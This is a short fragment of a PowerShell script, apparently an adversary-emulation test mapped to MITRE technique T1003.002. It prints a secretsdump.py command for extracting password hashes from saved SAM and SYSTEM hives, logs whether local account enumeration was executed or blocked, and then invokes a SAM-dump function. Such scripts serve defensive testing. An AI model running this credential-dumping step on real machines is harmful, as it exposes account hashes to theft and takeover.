        Write-Host "         python3 secretsdump.py -sam sam.tmp -system system.tmp LOCAL" -ForegroundColor Cyan
        Write-Host "  ===========================================" -ForegroundColor Red

        Log-Result "T1003.002" "Local account enumeration (no hash decrypt -- no Python)" "EXECUTED" "$($users.Count) accounts found"
    } else {
        Write-Fail "Could not enumerate local users"
        Log-Result "T1003.002" "Local account enumeration" "BLOCKED" "Get-LocalUser failed"
    }
}

# -- Executer le SAM dump --
Invoke-SamDump
